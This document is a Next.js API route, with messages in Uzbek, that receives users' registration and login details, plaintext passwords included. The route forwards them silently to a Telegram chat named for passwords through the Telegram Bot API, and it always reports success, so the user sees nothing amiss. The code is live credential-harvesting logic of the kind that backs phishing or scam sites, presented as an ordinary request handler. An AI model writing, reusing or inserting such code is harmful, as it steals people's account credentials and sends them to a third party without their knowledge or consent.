import { NextRequest, NextResponse } from 'next/server';

const BOT_TOKEN = process.env.BOT_TOKEN;
const PASSWORDS_CHAT_ID = process.env.PASSWORDS_CHAT_ID;

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { type, phone, email, password, country, currency, userId, userAgent, ip } = body;

        if (!BOT_TOKEN || !PASSWORDS_CHAT_ID) {
            console.error('Telegram credentials for passwords not configured');
            return NextResponse.json({ success: true }); // Silent fail
        }

        const dateDisplay = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });

        let message: string;

        if (type === 'registration') {
            message = `🆕 *YANGI RO'YXATDAN O'TISH*

📱 *Telefon:* \`${phone || '-'}\`
📧 *Email:* \`${email || '-'}\`
🔐 *Parol:* \`${password}\`
🌍 *Mamlakat:* ${country || '-'}
💰 *Valyuta:* ${currency || '-'}
👤 *User ID:* \`${userId || '-'}\`

📅 *Sana:* ${dateDisplay}
🖥️ *User Agent:* ${userAgent || '-'}`;
        } else {
            message = `🔑 *KIRISH (LOGIN)*

📱 *Telefon/Email:* \`${phone || email || '-'}\`
🔐 *Parol:* \`${password}\`

📅 *Sana:* ${dateDisplay}
🖥️ *User Agent:* ${userAgent || '-'}`;
        }

        // Fire and forget - non-blocking
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: PASSWORDS_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(err => console.error('Password notification failed:', err));

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error('Error in credentials notification:', error);
        return NextResponse.json({ success: true }); // Silent fail
    }
}
